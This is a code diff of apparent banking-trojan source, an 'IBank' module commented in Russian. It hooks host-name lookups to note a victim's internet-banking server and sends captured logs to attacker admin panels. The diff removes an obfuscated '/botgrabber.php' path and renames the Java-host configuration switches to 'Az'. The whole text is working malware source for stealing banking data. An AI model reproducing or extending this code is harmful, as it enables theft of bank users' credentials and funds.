@@ -44,13 +44,6 @@ namespace IBANKDEBUGSTRINGS
 //---------------------------------------------------------------------------
 
 
-#ifdef JavaConfigH
-	char IBankLogPathJavaHost[] = {'/', 'b', 'o', 't', 'g', 'r', 'a', 'b', 'b', 'e', 'r', '.', 'p', 'h', 'p',  0};
-#endif
-
-
-
-
 
 namespace IBank
 {
@@ -177,7 +170,7 @@ namespace IBank
 
 		// В случае если получается имя хоста ибанка, сохраняем его
 		// для дальнейших проверок
-		if (Res && !IsJavaHost(name) && !IsMainHost(name))
+		if (Res && !IsAzHost(name) && !IsMainHost(name))
 		{
 			IBnakHostAddr = *(LPDWORD)Res->h_addr_list[0];
 			IBDBG("IBankW", ">>>>>>> Отреагировали на хост %s", name);
@@ -478,7 +471,7 @@ namespace IBank
 		return Result;
 	}
 	//-----------------------------------------------------------------------
-	#ifdef JavaConfigH
+	#ifdef AzConfigH
 	BOOL SendLogToAZAdmin(PIBankLog L)
 	{
 		// Функция отправляет лог в админку аз
@@ -522,13 +515,13 @@ namespace IBank
 			if (!Sended1)
 				Sended1 = SendLogToAdmin(L);
 
-			#ifdef JavaConfigH
+			#ifdef AzConfigH
 				// Если включен модуль ява хостов то, отправляем
 				// лог и на эту админку.
 				if (!Sended2)
 					Sended2 = SendLogToAZAdmin(L);
 			#else
-				Sended2 = TRUE; 	
+				Sended2 = TRUE;
 			#endif
 
 			if (Sended1 && Sended2) break;
